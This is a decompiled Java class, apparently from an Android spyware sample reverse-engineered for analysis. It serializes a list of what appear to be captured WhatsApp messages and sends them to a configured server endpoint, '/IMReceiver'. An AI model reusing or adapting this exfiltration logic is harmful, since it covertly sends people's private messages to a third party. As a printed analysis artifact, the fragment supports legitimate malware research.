package com.app.system.common.d.a;

import android.content.Context;
import com.app.system.common.h;
import com.google.gson.f;
import com.security.WA.WaObject;
import java.io.IOException;
import java.util.List;
import okhttp3.Response;
import okhttp3.ResponseBody;

public class i
  extends a
{
  public i(String paramString)
  {
    super(null, paramString);
  }
  
  public int a(Context paramContext, List<WaObject> paramList)
  {
    try
    {
      h.a(paramContext, "INVIO IM Al Server");
      paramContext = new java/lang/StringBuilder;
      paramContext.<init>();
      paramContext.append(this.c);
      paramContext.append("/IMReceiver");
      paramContext.append('/');
      paramContext.append(this.a);
      paramList = com.app.system.common.d.a.a.a.a(paramContext.toString(), h.b().a(paramList));
      if (paramList != null)
      {
        String str = paramList.body().string();
        paramContext = new java/lang/StringBuilder;
        paramContext.<init>();
        paramContext.append("SendData Result: ");
        paramContext.append(paramList);
        com.security.d.a.d("ProtocolForIM", paramContext.toString(), new Object[0]);
        boolean bool = str.equals("1");
        if (bool) {
          return 1;
        }
      }
    }
    catch (IOException paramContext)
    {
      com.security.d.a.a("ProtocolForIM", paramContext.getMessage(), new Object[0]);
    }
    return 0;
  }
}


/* Location:              ~/com/app/system/common/d/a/i.class
 *
 * Reversed by:           J
 */